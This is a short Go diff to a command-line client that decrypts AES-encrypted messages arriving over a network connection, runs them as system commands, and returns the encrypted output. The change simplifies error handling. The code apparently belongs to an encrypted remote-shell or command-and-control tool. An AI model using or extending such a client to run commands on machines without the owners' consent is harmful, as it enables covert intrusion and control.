@@ -67,14 +67,8 @@ func LoadClientCLI() *cobra.Command {
 					fmt.Printf(" ---=== [ new packet ] ===---\nReceived: %s\nTranslated: %s\n\n", msg, decrypted)
 				}
 
-				out, err := ExecuteCommand(decrypted)
-				if err != nil {
-					fmt.Fprint(conn, aes.EncryptAes("command failure:\n", opts.AesKey))
-					fmt.Fprint(conn, aes.EncryptAes(err.Error(), opts.AesKey))
-				} else {
-
-					fmt.Fprint(conn, aes.EncryptAes(string(out), opts.AesKey)+"\n")
-				}
+				out, _ := ExecuteCommand(decrypted, opts)
+                fmt.Fprint(conn, aes.EncryptAes(out, opts.AesKey)+"\n")
 			}
 		},
 	}
